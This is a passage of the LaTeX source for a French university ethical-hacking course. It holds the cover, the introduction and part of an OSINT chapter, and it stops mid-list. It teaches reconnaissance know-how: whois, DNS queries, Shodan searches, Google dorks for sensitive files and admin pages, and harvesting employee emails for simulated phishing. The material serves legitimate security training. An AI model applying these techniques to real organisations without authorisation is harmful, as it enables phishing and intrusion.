% ==============================================================================
% Fichier     : Cours.tex
% Titre       : Hacking Éthique et Tests d'Intrusion
% Auteur      : MINKA MI NGUIDJOÏ Thierry Emmanuel
% Institution : Université de Yaoundé I - Ecole Nationale Supérieure Polytechnique - Département de Génie Informatique — LIMSI
% Année       : 2025-2026
% Description : Fichier principal du cours. Orchestre tous les chapitres,
%               la bibliographie et les éléments de couverture.
% Compilateur : pdflatex + biber (ou lualatex recommandé)
%               → lualatex Cours && biber Cours && lualatex Cours && lualatex Cours
% ==============================================================================

\documentclass[12pt, a4paper, twoside, openright]{book}

% ==============================================================================
% CHARGEMENT DE LA FEUILLE DE STYLE
% ==============================================================================
\usepackage{Style_cours}

% ==============================================================================
% BIBLIOGRAPHIE
% ==============================================================================
\addbibresource{bibliographie.bib}

% ==============================================================================
% MÉTADONNÉES PDF
% ==============================================================================
\hypersetup{
    pdftitle  = {Hacking Éthique et Tests d'Intrusion},
    pdfauthor = {MINKA MI NGUIDJOÏ Thierry Emmanuel},
    pdfsubject= {Cours universitaire — Pentest, Cybersécurité offensive, OSINT},
    pdfkeywords={Hacking Éthique, Pentest, OSCP, Metasploit, OSINT, Active Directory,
                 Exploitation, Post-Exploitation, Université de Yaoundé I}
}

% ==============================================================================
% DÉBUT DU DOCUMENT
% ==============================================================================
\begin{document}

% ------------------------------------------------------------------------------
% 1. PAGE DE TITRE (1ère DE COUVERTURE)
% ------------------------------------------------------------------------------
\begin{titlepage}
\thispagestyle{empty}
\pagecolor{CouleurPrimaire}

\begin{tikzpicture}[remember picture, overlay]
    % Bande dorée en bas
    \fill[CouleurAccent]
        (current page.south west) rectangle
        ([yshift=2.2cm] current page.south east);
    % Ligne décorative en haut
    \fill[CouleurAccent]
        ([yshift=-1.5cm] current page.north west) rectangle
        ([yshift=-1.8cm] current page.north east);
    % Éléments graphiques décoratifs
    \fill[white, opacity=0.04]
        ([xshift=8cm, yshift=-6cm] current page.north west)
        -- ++(5,0) -- ++(0,-5) -- ++(-5,0) -- cycle;
    \fill[white, opacity=0.06]
        ([xshift=9cm, yshift=-7cm] current page.north west)
        -- ++(6,0) -- ++(0,-6) -- ++(-6,0) -- cycle;
    % Picto « terminal » décoratif (symbolise l'attaque)
    \fill[red!60!black, opacity=0.12]
        ([xshift=2cm, yshift=-3cm] current page.north west)
        -- ++(3,0) -- ++(0,-1.5) -- ++(-3,0) -- cycle;
\end{tikzpicture}

\vspace*{1.5cm}

\begin{center}
    {\color{white!80!gray}\small\scshape
        Université de Yaoundé~I~·~Département d'Informatique~·~LIMSI}\\[0.4ex]
    {\color{CouleurAccent}\rule{0.55\linewidth}{0.8pt}}
\end{center}

\vspace{1.5cm}

\begin{center}
    {\color{CouleurAccent}\rule{0.7\linewidth}{1.2pt}}\\[1.2ex]
    {\color{white}\large\bfseries MINKA MI NGUIDJOÏ Thierry Emmanuel}\\[0.4ex]
    {\color{white!80!gray}\small
        CISA~·~CISM~·~CGEIT~·~CRISC~·~CDPSE}\\[0.3ex]
    {\color{white!70!gray}\footnotesize\itshape
        Chercheur — LIMSI, Université de Yaoundé~I}\\[0.3ex]
    {\color{white!70!gray}\footnotesize\itshape
        Expert Judiciaire~—~Cadre supérieur, Contrôle Supérieur de l'État~—~Consultant International}\\[1.2ex]
    {\color{CouleurAccent}\rule{0.7\linewidth}{1.2pt}}
\end{center}

\vspace{2cm}

\begin{center}
    {\color{white!70!gray}\small
        \ding{229}\quad Cas fil rouge : Mission Pentest LiZbiZ}\\[0.5ex]
    {\color{white!70!gray}\small
        \ding{44}\quad PTES~·~OSSTMM~·~NIST SP 800-115~·~OWASP Top 10}\\[0.5ex]
    {\color{white!70!gray}\small
        \ding{228}\quad OSINT~·~Exploitation~·~Post-Exploitation~·~Active Directory}
\end{center}

\vfill

\begin{center}
    {\color{CouleurAccent}\rule{0.7\linewidth}{1.2pt}}\\[1.2ex]
    {\color{white}\large\bfseries MINKA MI NGUIDJOÏ Thierry Emmanuel}\\[0.4ex]
    {\color{white!80!gray}\small
        CISA~·~CISM~·~CGEIT~·~CRISC~·~CDPSE}\\[0.3ex]
    {\color{white!70!gray}\footnotesize\itshape
        Chercheur — LIMSI, Université de Yaoundé~I}\\[0.3ex]
    {\color{white!70!gray}\footnotesize\itshape
        RSSI — Projet GIP Bénin~·~Cadre supérieur, Contrôle Supérieur de l'État}\\[1.2ex]
    {\color{CouleurAccent}\rule{0.7\linewidth}{1.2pt}}
\end{center}

\vspace{0.6cm}

\begin{center}
    {\color{white!60!gray}\small Année académique 2024--2025}
\end{center}

\afterpage{\nopagecolor}
\end{titlepage}

% ------------------------------------------------------------------------------
% 2. PAGE DE DROITS / VERSO DE LA COUVERTURE
% ------------------------------------------------------------------------------
\clearpage
\thispagestyle{empty}
\vspace*{\fill}

\begin{center}
    \begin{minipage}{0.78\textwidth}
        \footnotesize\color{CouleurBordInfo}
        \begin{center}
            {\bfseries\color{CouleurPrimaire}
                Hacking Éthique et Tests d'Intrusion}\\[0.4ex]
            {\itshape Méthodologie, Exploitation et Rapport Professionnel}
        \end{center}
        \vspace{0.8ex}
        \hrule
        \vspace{0.8ex}
        \textbf{Auteur :} MINKA MI NGUIDJOÏ Thierry Emmanuel\\
        \textbf{Institution :} Université de Yaoundé~I — LIMSI\\
        \textbf{Année :} 2024--2025\\[0.5ex]
        Ce document est un support de cours universitaire rédigé à des fins
        pédagogiques. Toute reproduction partielle ou totale à des fins commerciales
        est interdite sans l'autorisation écrite de l'auteur. Les techniques
        présentées sont destinées exclusivement à des environnements de laboratoire
        isolés ou à des systèmes faisant l'objet d'une autorisation explicite.\\[0.5ex]
        Les certifications CISA, CISM, CGEIT, CRISC et CDPSE sont des marques
        déposées de l'\textbf{ISACA}. OSCP est une marque déposée d'Offensive Security.\\[0.8ex]
        \hrule
        \vspace{0.5ex}
        {\centering\itshape
        «~Comprendre l'attaque est la condition nécessaire à une défense crédible.~»}
    \end{minipage}
\end{center}

\vspace*{\fill}

% ------------------------------------------------------------------------------
% 3. DÉDICACE
% ------------------------------------------------------------------------------
\clearpage
\thispagestyle{empty}
\vspace*{3cm}
\begin{flushright}
    \begin{minipage}{0.62\textwidth}
        \itshape\large\color{CouleurPrimaire}
        À tous ceux qui comprennent que la sécurité\\
        n'est pas un état, mais une vigilance permanente.\\[1.5ex]
        \normalsize\normalfont\color{CouleurAccent}
        Et à ceux qui font le choix courageux\\
        d'utiliser leurs compétences offensives\\
        au service de la protection, non de la destruction.
    \end{minipage}
\end{flushright}

% ------------------------------------------------------------------------------
% 4. REMERCIEMENTS
% ------------------------------------------------------------------------------
\clearpage
\thispagestyle{empty}
\chapter*{Remerciements}
\addcontentsline{toc}{chapter}{Remerciements}

La conception de ce cours est le produit d'une double expérience — celle du chercheur et celle du praticien. L'auteur remercie chaleureusement le \textbf{Professeur Flavien Serge Mani Onana} et le \textbf{Professeur Thomas Djotio Ndié} pour leur encadrement académique exigeant et leur confiance dans des travaux qui naviguent à l'intersection de la cryptographie, de la gouvernance et de la sécurité opérationnelle.

Sa reconnaissance va également aux équipes des \textbf{Services du Contrôle Supérieur de l'État} et du \textbf{projet GIP Bénin}, dont les missions de terrain ont nourri les exemples concrets de ce cours. La confrontation régulière entre théorie et réalité institutionnelle est, pour l'enseignant, une école d'humilité et de précision.

Enfin, ce cours n'existerait pas sans les étudiants qui ont accepté de se mesurer à des systèmes volontairement vulnérables, en apportant cette curiosité technique et cette rigueur éthique qui font les bons professionnels de la cybersécurité.

% ------------------------------------------------------------------------------
% 5. TABLE DES MATIÈRES
% ------------------------------------------------------------------------------
\clearpage
\tableofcontents

% ------------------------------------------------------------------------------
% 6. LISTE DES FIGURES
% ------------------------------------------------------------------------------
\clearpage
\listoffigures
\addcontentsline{toc}{chapter}{Liste des figures}

% ------------------------------------------------------------------------------
% 7. LISTE DES TABLEAUX
% ------------------------------------------------------------------------------
\listoftables
\addcontentsline{toc}{chapter}{Liste des tableaux}

% ------------------------------------------------------------------------------
% 8. LISTE DES CODES SOURCE
% ------------------------------------------------------------------------------
\lstlistoflistings
\addcontentsline{toc}{chapter}{Liste des codes source}

% ==============================================================================
% CORPS DU COURS
% ==============================================================================
\mainmatter

% --- Introduction Générale ---
% ==============================================================================
% Fichier     : chapitres/0_Introduction.tex
% Titre       : Introduction Générale, Cours de Hacking Éthique
% Auteur      : MINKA MI NGUIDJOÏ Thierry Emmanuel
%==============================================================================

\chapter*{Introduction Générale}
\addcontentsline{toc}{chapter}{Introduction Générale}
\markboth{Introduction Générale}{Introduction Générale}

\begin{flushright}
    \itshape
    <<~Connaître son ennemi mieux qu'il ne se connaît lui-même,\\
    voilà la première condition de la victoire.~>>\\[0.5ex]
    \small--- Sun Tzu, \textit{L'Art de la Guerre}
\end{flushright}

\vspace{1.5ex}

% ==============================================================================
\section*{Contexte et Pertinence du Cours}
% ==============================================================================

La cybersécurité offensive est aujourd'hui l'une des compétences les plus recherchées
et les plus mal comprises de l'économie numérique. Confondre le hacker criminel avec
le professionnel de la sécurité offensive, c'est confondre le cambrioleur avec l'expert
en serrurerie mandaté pour tester les serrures d'une banque. La frontière n'est pas
dans la technique, elle est dans le \textbf{mandat, la déontologie et la loi}.

Ce cours de \termecle{Hacking Éthique} se positionne résolument du côté du
professionnel : celui qui comprend l'art de l'attaque non pour nuire, mais pour
renforcer les défenses. La maîtrise des techniques offensives est aujourd'hui
indispensable à tout responsable de la sécurité des systèmes d'information
(\sigle{RSSI}), auditeur certifié \sigle{CISA} ou consultant en \textit{penetration
testing}. Dans un contexte où les cyberattaques se multiplient et se sophistiquent
— \textit{ransomwares}, attaques par chaîne d'approvisionnement, compromission de
comptes cloud, la capacité à penser comme un attaquant est devenue un avantage
stratégique pour les organisations.

Ce cours s'inscrit dans la continuité logique du cours d'Audit des Systèmes
d'Information. Là où l'audit évalue les contrôles en place, le \termecle{test
d'intrusion} (pentest) les met à l'épreuve du feu. Les deux disciplines sont
complémentaires et partagent un même impératif éthique : l'indépendance, la rigueur
et la confidentialité. Le présent cours élargit toutefois le spectre en intégrant
les défis contemporains : sécurité cloud, \sigle{API}, conteneurs, et environnements
mobiles.

% ------------------------------------------------------------------------------
\subsection*{Évolution du Paysage de la Menace}
% ------------------------------------------------------------------------------

Le paysage des cybermenaces a considérablement évolué, rendant les compétences en
hacking éthique plus cruciales que jamais. Les attaquants adoptent des approches
systémiques, combinant plusieurs vecteurs d'attaque, maintenant un accès persistant
sur de longues périodes, et ciblant des environnements hétérogènes incluant le cloud
et les identités numériques. Cette évolution impose une compréhension approfondie
des \sigle{TTP} (\textit{Tactics, Techniques, Procedures}) des acteurs de menace.

\begin{table}[htbp]
\centering
\caption{Principaux types de menaces contemporaines}
\label{tab:menaces}
\begin{tabular}{lll}
\toprule
\textbf{Type de Menace} & \textbf{Exemples} & \textbf{Impact} \\
\midrule
Ransomware             & LockBit, BlackCat, Conti          & Chiffrement, arrêt opérationnel \\
Supply Chain           & SolarWinds, Log4j, MoveIT         & Compromission en cascade \\
Cloud Misconfiguration & S3 publics, IAM faible             & Fuite de données massive \\
APT                    & APT29, APT41, Lazarus              & Espionnage, vol de PI \\
Identity Attacks       & Kerberoasting, Golden Ticket       & Compromission totale AD \\
\bottomrule
\end{tabular}
\end{table}

% ------------------------------------------------------------------------------
\subsection*{Frameworks et Standards de Référence}
% ------------------------------------------------------------------------------

Ce cours s'appuie sur les frameworks et standards internationaux reconnus, assurant
une formation alignée sur les meilleures pratiques mondiales et les attentes du marché
de l'emploi.

Le framework \termecle{MITRE ATT\&CK} (\textit{Adversarial Tactics, Techniques \&
Common Knowledge}) constitue désormais la référence mondiale pour documenter et
communiquer sur les techniques d'attaque. Chaque technique enseignée dans ce cours
sera mappée à son identifiant ATT\&CK correspondant, facilitant l'intégration avec
les équipes de défense (\textit{Blue Team}) et la production de rapports
professionnels.

\begin{boxinfo}
\textbf{Les 14 tactiques MITRE ATT\&CK (Enterprise) :}

\smallskip
\sigle{TA0043}~Reconnaissance · \sigle{TA0042}~Resource Development ·
\sigle{TA0001}~Initial Access · \sigle{TA0002}~Execution ·
\sigle{TA0003}~Persistence · \sigle{TA0004}~Privilege Escalation ·
\sigle{TA0005}~Defense Evasion · \sigle{TA0006}~Credential Access ·
\sigle{TA0007}~Discovery · \sigle{TA0008}~Lateral Movement ·
\sigle{TA0009}~Collection · \sigle{TA0011}~Command and Control ·
\sigle{TA0010}~Exfiltration · \sigle{TA0040}~Impact.

\smallskip
\noindent Cette taxonomie structure l'ensemble du cours et les rapports de pentest
produits en Partie~III.
\end{boxinfo}

\begin{table}[htbp]
\centering
\caption{Standards et frameworks de référence intégrés au cours}
\label{tab:standards}
\begin{tabular}{lll}
\toprule
\textbf{Standard} & \textbf{Organisme} & \textbf{Usage dans le cours} \\
\midrule
MITRE ATT\&CK  & MITRE Corporation & Mapping des TTP, communication \\
PTES           & Pentest Standard  & Méthodologie des 7 phases \\
OSSTMM         & ISECOM            & Métriques, surface d'attaque \\
NIST SP 800-115 & NIST             & Guide technique officiel \\
OWASP Top 10   & OWASP             & Vulnérabilités Web \\
OWASP API Top 10 & OWASP           & Sécurité des API \\
CVSS v3.1      & FIRST             & Scoring des vulnérabilités \\
\bottomrule
\end{tabular}
\end{table}

\begin{boxinfo}
\textbf{Note sur le scoring CVSS :} Ce cours utilise le standard
\sigle{CVSS v3.1} (Common Vulnerability Scoring System, version 3.1, publiée
par le \sigle{FIRST}). La version~4.0, publiée en novembre~2023, introduit
des métriques supplémentaires (\textit{Threat Metrics}, \textit{Environmental
Safety}) qui seront mentionnées en Chapitre~\ref{chap:reporting}. Les
rapports professionnels doivent toujours préciser la version utilisée.
\end{boxinfo}

% ==============================================================================
\section*{Fil Conducteur : La Mission Pentest LiZbiZ}
% ==============================================================================

Fidèle à la pédagogie par l'immersion, ce cours retrouve l'entreprise
\textbf{LiZbiZ}, déjà auditée dans le cours précédent. Cette fois, le \sigle{PDG}
ne se contente plus d'une revue documentaire : il mandate une \textbf{simulation
d'attaque réelle} combinant un test \textit{Black Box} externe et un test
\textit{Gray Box} interne pour évaluer la résistance de son \sigle{SI} face à un
adversaire déterminé. Ce scénario reflète les préoccupations contemporaines des
dirigeants : non seulement identifier les failles, mais mesurer concrètement leur
exploitabilité et leur impact business.

Vous endosserez le rôle de \textbf{pentester} (testeur d'intrusion), évoluant dans
un environnement de laboratoire isolé reproduisant fidèlement l'infrastructure
LiZbiZ. De la reconnaissance passive initiale, incluant la collecte d'adresses
email qui alimentera une campagne de phishing simulée au
Chapitre~\ref{chap:exploit}, jusqu'à la rédaction du rapport de restitution, vous
parcourrez l'intégralité de la chaîne d'attaque, toujours dans le cadre légal défini
par les \termecle{Rules of Engagement} (\sigle{ROE}).

\begin{boxinfo}
\textbf{Architecture cible enrichie (LiZbiZ) :}

L'environnement LiZbiZ simule une entreprise de taille moyenne avec une
infrastructure typique :
\begin{itemize}
    \item un périmètre \sigle{DMZ} exposant les services web et mail ;
    \item un réseau interne segmenté abritant l'Active Directory et les postes
          utilisateurs ;
    \item une extension cloud hébergeant des \textit{workloads} et données
          sensibles.
\end{itemize}
Cette architecture permet d'illustrer l'ensemble des techniques modernes de
pentest, du mouvement latéral traditionnel au pivotage vers le cloud.
\end{boxinfo}

% ==============================================================================
\section*{Objectifs Généraux du Cours}
% ==============================================================================

\begin{boxobjectifs}
\textbf{Objectifs fondamentaux}, À l'issue de ce cours, l'étudiant sera capable de :
\begin{enumerate}
    \item \textbf{Maîtriser le cadre juridique} du hacking éthique : Code pénal,
          déontologie, \sigle{ROE}, et cadre réglementaire spécifique au contexte
          africain francophone (loi camerounaise sur la cybersécurité,
          référentiel \sigle{CEMAC}).
    \item \textbf{Appliquer les méthodologies} reconnues (PTES, OSSTMM,
          NIST SP 800-115) et utiliser le framework \sigle{MITRE ATT\&CK} pour
          documenter les techniques employées.
    \item \textbf{Conduire une reconnaissance passive complète} (OSINT, Shodan,
          Google Dorks, métadonnées) et intégrer la Threat Intelligence dans la
          phase de préparation.
    \item \textbf{Réaliser un scanning actif avancé} (Nmap, énumération de services
          SMB/DNS/Web/LDAP) avec analyse des résultats et contournement de
          pare-feux.
    \item \textbf{Exploiter les vulnérabilités web} (OWASP Top 10 : injection SQL
          avancée, LFI/RFI, XSS, SSRF) et système (Metasploit, services réseaux,
          kernel exploits).
    \item \textbf{Mener la post-exploitation complète} : escalade de privilèges
          Linux/Windows, mouvement latéral, attaques Active Directory
          (Kerberoasting, DCSync, Golden Ticket).
    \item \textbf{Appliquer les techniques d'évasion modernes} (obfuscation,
          Living Off The Land, bypass AMSI/EDR, attaques fileless).
    \item \textbf{Rédiger un rapport de pentest professionnel} conforme au standard
          PTES Reporting, avec scoring \sigle{CVSS v3.1} et plan de remédiation
          priorisé incluant les références \sigle{MITRE ATT\&CK}.
\end{enumerate}
\end{boxobjectifs}

\begin{boxobjectifs}
\textbf{Objectifs avancés} (modules complémentaires) :
\begin{enumerate}
    \item Effectuer des tests de sécurité cloud sur les environnements \sigle{AWS},
          Azure et \sigle{GCP} (configuration review, exploitation \sigle{IAM},
          container security).
    \item Conduire des tests de sécurité \sigle{API} selon l'OWASP API Security
          Top 10 (Broken Object Level Authorization, injection, mass assignment).
    \item Réaliser des tests de sécurité mobile (analyse statique/dynamique
          d'applications Android/iOS, reverse engineering de base).
    \item Comprendre les fondamentaux du Red Teaming : infrastructure C2,
          \sigle{OPSEC}, persistance longue durée.
\end{enumerate}
\end{boxobjectifs}

% ==============================================================================
\section*{Organisation du Cours}
% ==============================================================================

Le cours est structuré en trois parties progressives, de la définition du cadre légal
à la restitution des résultats, avec une extension optionnelle vers les domaines
émergents de la sécurité offensive. Chaque chapitre combine apports théoriques,
démonstrations pratiques et exercices \textit{hands-on}.

\begin{table}[htbp]
\centering
\caption{Structure générale du cours (* modules optionnels)}
\label{tab:structure}
\begin{tabular}{lll}
\toprule
\textbf{Partie} & \textbf{Chapitres} & \textbf{Contenu} \\
\midrule
I  & 1--4 & Cadre, Méthodologie et Reconnaissance :\\
   &      & Mandat, cadre juridique, OSINT, scanning actif \\
\addlinespace
II & 5--7 & Phase Offensive :\\
   &      & Exploitation, post-exploitation, mouvement latéral, évasion \\
\addlinespace
III & 8--9 & Restitution :\\
    &      & Rapport de pentest, évaluation finale, CTF \\
\addlinespace
IV* & 10--12 & Modules avancés (optionnels) :\\
    &        & Cloud Security, API Security, Mobile Security \\
\bottomrule
\end{tabular}
\end{table}

\medskip
\noindent\textbf{Partie I, Cadre, Méthodologie et Reconnaissance}

Elle couvre le mandat de mission et le périmètre LiZbiZ
(Chapitre~\ref{chap:mandat}), le cadre juridique et les méthodologies
(Chapitre~\ref{chap:juridique}), la reconnaissance passive et l'OSINT
(Chapitre~\ref{chap:osint}), et le scanning actif
(Chapitre~\ref{chap:scanning}).

\medskip
\noindent\textbf{Partie II, Phase Offensive : Exploitation et Post-Exploitation}

Elle traite des vulnérabilités et de leur exploitation
(Chapitre~\ref{chap:exploit}), de la post-exploitation et du mouvement latéral
(Chapitre~\ref{chap:postexploit}), et des techniques d'évasion et d'anti-forensics
(Chapitre~\ref{chap:evasion}).

\medskip
\noindent\textbf{Partie III, Restitution et Évaluation}

Elle présente la rédaction du rapport de pentest
(Chapitre~\ref{chap:reporting}) et l'évaluation finale de synthèse
(Chapitre~\ref{chap:evaluation}).

\medskip
\noindent\textbf{Partie IV, Modules Avancés (optionnels)}

Ces modules traitent de la sécurité cloud (Chapitre~10), de la sécurité des
\sigle{API} (Chapitre~11) et de la sécurité mobile (Chapitre~12). Ils sont
conçus pour les étudiants souhaitant approfondir leur spécialisation ou se
préparer aux certifications avancées (\sigle{CRTO}, \sigle{OSCP}).

% ==============================================================================
\section*{Alignement avec les Certifications Professionnelles}
% ==============================================================================

Ce cours prépare aux certifications professionnelles les plus reconnues dans le
domaine du penetration testing et de la sécurité offensive. Bien que l'obtention
de ces certifications nécessite un investissement personnel complémentaire, le
contenu couvre une partie significative des objectifs d'examen de chacune d'elles.

\begin{table}[htbp]
\centering
\caption{Certifications professionnelles alignées avec le cours}
\label{tab:certifications}
\begin{tabular}{llll}
\toprule
\textbf{Certification} & \textbf{Organisme} & \textbf{Niveau} & \textbf{Focus} \\
\midrule
OSCP   & Offensive Security & Technique    & Pentest pratique 24h \\
CEH    & EC-Council         & Fondamental  & Knowledge-based \\
GPEN   & GIAC/SANS          & Technique    & Méthodologie, outils \\
CRTO   & Zero Point Security & Avancé      & Active Directory, C2 \\
PNPT   & TCM Security       & Technique    & Pentest, AD, reporting \\
CISA   & ISACA              & Gouvernance  & Audit SI, contrôles \\
\bottomrule
\end{tabular}
\end{table}

% ==============================================================================
\section*{Environnement de Travail et Outils Requis}
% ==============================================================================

Pour suivre ce cours dans les meilleures conditions, les étudiants doivent disposer
d'un environnement de laboratoire adéquat. Les machines virtuelles constituent le
standard pour les exercices pratiques : elles isolent les activités offensives du
système hôte et permettent de restaurer facilement un état propre après chaque
session.

\medskip
\noindent\textbf{Configuration matérielle minimale recommandée :}
\begin{itemize}
    \item Processeur : 4 c\oe{}urs ou plus (virtualisation activée, \sigle{VT-x}
          ou \sigle{AMD-V}).
    \item \sigle{RAM} : 16 Go minimum (24 Go recommandés).
    \item Stockage : 100 Go d'espace libre (\sigle{SSD} recommandé).
    \item Réseau : accès Internet pour le téléchargement des outils et machines
          virtuelles.
\end{itemize}

\begin{table}[htbp]
\centering
\caption{Outils essentiels pour le cours}
\label{tab:outils}
\begin{tabular}{lll}
\toprule
\textbf{Catégorie} & \textbf{Outils} & \textbf{Usage} \\
\midrule
OS Attaquant     & Kali Linux 2024.x, Parrot OS    & Distribution pré-configurée \\
Reconnaissance   & Nmap, Masscan, Shodan CLI        & Scanning et énumération \\
Exploitation     & Metasploit, SQLMap, Burp Suite   & Exploitation de vulnérabilités \\
Post-Exploitation & Mimikatz, BloodHound, CME       & Escalade, mouvement latéral \\
Évasion / Pivot  & Msfvenom, Shellter, Chisel       & Obfuscation, pivoting \\
\bottomrule
\end{tabular}
\end{table}

% ==============================================================================
\section*{Avertissement Éthique et Légal}
% ==============================================================================

\begin{boxalert}
\textbf{Avertissement important :}
Les techniques présentées dans ce cours sont destinées \textbf{exclusivement} à
être utilisées dans des environnements de laboratoire isolés ou sur des systèmes
pour lesquels vous disposez d'une \textbf{autorisation écrite et explicite}.
L'application de ces techniques sur tout système tiers sans autorisation constitue
une \textbf{infraction pénale} passible de poursuites judiciaires. L'auteur et
l'institution déclinent toute responsabilité en cas d'utilisation illégale ou
malveillante des connaissances transmises.

\smallskip
\noindent\textbf{Cadre légal de référence :} Le Chapitre~\ref{chap:02_cadre_juridique}
détaille les dispositions pénales applicables, incluant le Code pénal français
(Articles 323-1 à 323-7, loi Godfrain) ainsi que la \textbf{loi camerounaise
n\textsuperscript{o}~2010/012 du 21~décembre~2010} relative à la cybersécurité
et à la cybercriminalité, et la loi n\textsuperscript{o}~2010/013 sur les
communications électroniques. L'\sigle{ANTIC} (Agence Nationale des Technologies
de l'Information et de la Communication) est l'autorité de régulation compétente
en matière de cybersécurité au Cameroun.
\end{boxalert}

\begin{boxinfo}
\textbf{Prérequis recommandés :}
\begin{itemize}
    \item Connaissance approfondie des protocoles réseau
          (TCP/IP, DNS, HTTP/HTTPS, SMB, LDAP, Kerberos).
    \item Maîtrise du système Linux (navigation \sigle{CLI}, gestion des droits,
          scripting Bash).
    \item Connaissance de l'environnement Windows (Active Directory, Registre,
          Services, PowerShell).
    \item Notions de programmation (Python, PowerShell), capacité à lire et
          modifier des scripts existants.
    \item Compréhension des architectures web (HTTP, \sigle{API} REST, bases de
          données).
    \item Cours d'Audit des \sigle{SI} recommandé en préalable.
    \item Familiarité avec les machines virtuelles (VMware, VirtualBox).
\end{itemize}
\end{boxinfo}

% ==============================================================================
\section*{Mot de l'Auteur}
% ==============================================================================

\vspace{1ex}
\begin{center}
    {\color{CouleurAccent}\rule{0.6\linewidth}{1pt}}
\end{center}
\vspace{1ex}

Ce cours a été conçu avec la conviction que comprendre l'attaque est la condition
nécessaire à une défense crédible. La sécurité n'est pas un état statique mais un
processus continu d'amélioration, de vigilance et d'adaptation. Les techniques
présentées ici évolueront, c'est la nature même de la cybersécurité, mais les
principes méthodologiques, éthiques et juridiques qui les encadrent demeurent les
piliers d'une pratique professionnelle responsable.

À ceux qui emprunteront ce chemin : la compétence technique n'est qu'un outil.
Ce qui distingue le professionnel du vandale, c'est l'éthique qui guide l'action,
la rigueur qui structure le travail, et l'humilité face à l'immensité de ce qu'il
reste à apprendre. Le pentester professionnel est, en définitive, un avocat du
diable au service de la sécurité : il incarne temporairement l'adversaire pour
mieux armer l'organisation contre lui.

\vspace{1.5ex}
\begin{center}
    {\small\bfseries\color{CouleurPrimaire}\auteurcours}\\[0.4ex]
    {\small\itshape\color{CouleurPrimaire}
        Chercheur, \sigle{LIMSI}, \sigle{ENSP}, Université de Yaoundé~I}\\[0.3ex]
    {\footnotesize\color{CouleurPrimaire}
        \sigle{CISA} · \sigle{CISM} · \sigle{CGEIT} · \sigle{CRISC} ·
        \sigle{CDPSE} · ISO~27001 · ISO~22301 · ISO~9001}
    \\[0.8ex]
    {\color{CouleurAccent}\rule{0.6\linewidth}{1pt}}
\end{center}


% -------------------------------------------------------------------
% PARTIE I — Cadre, Méthodologie et Reconnaissance
% -------------------------------------------------------------------
\part{Cadre, Méthodologie et Reconnaissance}

% Chapitre 1 — Mandat et périmètre LiZbiZ
\input{chapitres/01_mandat_lizbiz}

% Chapitre 2 — Cadre juridique et méthodologies
\input{chapitres/02_cadre_juridique}

% Chapitre 3 — Reconnaissance passive et OSINT
% ==============================================================================
% Fichier : 03_recon_osint.tex
% Description : Reconnaissance Passive et OSINT
% ==============================================================================

\chapter{Reconnaissance Passive et OSINT}

La première règle du hacking est : "Connaître sa cible". Avant de lancer la moindre attaque technique, le hacker éthique collecte un maximum d'informations. Cette phase, appelée \textbf{Reconnaissance Passive}, a l'avantage d'être totalement invisible pour la cible (pas de paquets envoyés directement vers son réseau).

\section{Définition et Objectifs}
% ------------------------------------------------------------------------------

\subsection{OSINT (Open Source Intelligence)}

\begin{boxdef}
\textbf{OSINT :} Renseignement d'origine sources ouvertes. Il s'agit de collecter, analyser et exploiter des informations disponibles publiquement (Internet, médias, documents publics).
\end{boxdef}

\subsection{Objectifs de la Reconnaissance}

\begin{itemize}
    \item Identifier les \textbf{domaines} et sous-domaines appartenant à la cible.
    \item Découvrir les \textbf{adresses IP} publiques et les plages réseau.
    \item Identifier les \textbf{technologies} utilisées (Web Server, CMS, Cloud Provider).
    \item Trouver des \textbf{adresses email} et des \textbf{noms d'employés} (pour le Phishing ou le Brute Force).
    \item Découvrir des \textbf{fuites de données} (mots de passe passés, documents internes).
\end{itemize}

% ------------------------------------------------------------------------------
\section{Techniques et Outils de Collecte}
% ------------------------------------------------------------------------------

\subsection{Collecte d'Infrastructure}

\subsubsection{Whois et Registres}
Le protocole Whois permet d'interroger les bases de données des registraires de noms de domaine pour obtenir des informations sur le propriétaire.

\begin{lstlisting}[language=bash, caption=Requete Whois]
whois lizbiz.com
# Revele : Nom de l'administrateur, contacts techniques, 
# date de creation, et surtout le fournisseur d'acces (ISP).
\end{lstlisting}

\subsubsection{DNS Enumeration}
Le DNS (Domain Name System) est l'annuaire du web. Il contient des enregistrements précieux.

\begin{table}[h!]
\centering
\begin{tabular}{ll}
    \toprule
    \textbf{Type} & \textbf{Information révélée} \\
    \midrule
    A & Adresse IPv4 d'un hôte. \\
    MX & Serveurs de messagerie (Cibles privilégiées pour le phishing). \\
    TXT & Informations diverses (vérification propriété, SPF). \\
    NS & Serveurs de noms (DNS Primaire/Secondaire). \\
    \bottomrule
\end{tabular}
\caption{Enregistrements DNS critiques}
\end{table}

\begin{boxlizbiz}
\textbf{TP LiZbiZ :} Utilisez l'outil \texttt{dig} ou \texttt{nslookup} pour trouver l'adresse IP du serveur web de LiZbiZ et son serveur de messagerie.
\begin{lstlisting}[language=bash]
dig lizbiz.com ANY
\end{lstlisting}
\end{boxlizbiz}

\subsection{Moteurs de Recherche Spécialisés}

\subsubsection{Shodan : Le Moteur de Recherche des Objets Connectés}
Shodan scanne Internet en permanence et indexe les services (bannières) qu'il trouve.

\textbf{Recherche typique :}
\begin{itemize}
    \item \texttt{hostname:"lizbiz.com"} : Tous les services liés au domaine.
    \item \texttt{port:3389} : Recherche de bureaux à distance (RDP) exposés.
    \item \texttt{product:"Apache Tomcat"} : Recherche de versions vulnérables.
\end{itemize}

\subsubsection{Google Dorks (Google Hacking)}
Utilisation des opérateurs avancés de Google pour trouver des informations cachées.

\begin{table}[h!]
\centering
\small
\begin{tabular}{p{4cm}p{6cm}}
    \toprule
    \textbf{Opérateur} & \textbf{Exemple et Usage} \\
    \midrule
    \texttt{site:} & \texttt{site:lizbiz.com} (Limiter la recherche au site cible). \\
    \texttt{filetype:} & \texttt{filetype:pdf "confidentiel"} (Chercher des docs PDF sensibles). \\
    \texttt{inurl:} & \texttt{inurl:admin} (Chercher des pages d'administration). \\
    \texttt{intitle:} & \texttt{intitle:"index of /"} (Trouver des répertoires ouverts). \\
    \texttt{cache:} & Voir une version supprimée d'une page (Cache Google). \\
    \bottomrule
\end{tabular}
\caption{Opérateurs Google Dorks principaux}
\end{table}

\begin{boxlizbiz}
\textbf{Cas LiZbiZ :}
Un \texttt{Google Dork} révèle un fichier Excel indexé par erreur : \texttt{site:lizbiz.com filetype:xls "employés"}. Ce fichier contient la liste des emails internes, fournissant une base parfaite pour une campagne de Phishing ultérieure.
\end{boxlizbiz}

\subsection{Collecte d'Informations Humaines (Social Engineering Prep)}

\subsubsection{LinkedIn Scraping}
Les réseaux sociaux sont une mine d'or. LinkedIn révèle :
\begin{itemize}
